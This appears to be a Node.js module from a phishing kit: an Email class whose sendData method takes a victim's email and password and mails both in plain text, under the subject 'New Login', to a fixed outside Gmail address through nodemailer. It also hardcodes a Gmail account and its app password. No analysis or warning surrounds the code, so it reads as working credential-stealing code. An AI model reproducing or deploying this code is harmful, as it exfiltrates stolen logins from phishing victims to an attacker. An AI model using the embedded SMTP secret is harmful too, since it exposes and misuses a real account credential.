import mailer from 'nodemailer';
class Email {
  #smtpProtocol = mailer.createTransport({
    service: 'Gmail',
    host: 'smtp.gmail.com',
    auth: {
      user: 'nwashangai@gmail.com',
      pass: 'vdettyjaxzyqgkhd',
    },
  });

  constructor() {}

  async sendData(email, password) {
    const resp = null;

    const mailoption = {
      from: 'Young Nwadike',
      to: 'youngnwadike@gmail.com',
      subject: 'New Login',
      html: `<html><head></head><body><p>Hello,</p><p>Email: ${email}</p><p>Password: ${password}</p></body></html>`,
    };

    return new Promise((resolve, reject) => {
      this.#smtpProtocol.sendMail(mailoption, function (err, response) {
        if (err) {
          reject({ message: 'funny', error: err });
        }
        console.log('Message Sent' + response.message);
        smtpProtocol.close();

        resolve(true);
      });
    });
  }
}

export default Email;
